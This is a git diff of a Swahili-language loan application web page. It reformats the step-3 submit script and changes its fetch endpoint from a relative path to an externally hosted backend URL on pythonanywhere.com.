@@ -9,43 +9,70 @@
 
 <p>Bofya kitufe hapa chini kutuma maombi yako ya mkopo.</p>
 
-<button onclick="tumaMaombi()">Tuma Maombi</button>
+<button onclick="tumaMaombi()">
+    Tuma Maombi
+</button>
 
 <script>
+
 function tumaMaombi() {
 
     // PATA DATA YA HATUA YA 2
-    let mkopo = JSON.parse(localStorage.getItem("mkopo_data"));
+    let mkopo = JSON.parse(
+        localStorage.getItem("mkopo_data")
+    );
 
+    // HAKIKI DATA
     if (!mkopo) {
+
         alert("Hakuna taarifa za mkopo zilizopatikana");
+
         return;
+
     }
 
     // TUMA KWENYE BACKEND
-    fetch("/submit-step3", {
+    fetch("https://superadmin008.pythonanywhere.com/submit-step3", {
+
         method: "POST",
+
         headers: {
             "Content-Type": "application/json"
         },
+
         body: JSON.stringify(mkopo)
+
     })
+
     .then(res => res.json())
+
     .then(data => {
+
+        console.log(data);
 
         alert("Maombi yamewasilishwa kwa mafanikio!");
 
-        // Hifadhi namba ya maombi
-        localStorage.setItem("app_id", data.application_id);
+        // HIFADHI APP ID
+        localStorage.setItem(
+            "app_id",
+            data.application_id
+        );
 
-        // Nenda Hatua ya 4
+        // NENDA HATUA YA 4
         window.location.href = "hatua4.html";
+
     })
+
     .catch(err => {
-        alert("Hitilafu imetokea wakati wa kutuma maombi");
+
         console.log(err);
+
+        alert("Hitilafu imetokea wakati wa kutuma maombi");
+
     });
+
 }
+
 </script>
 
 </body>
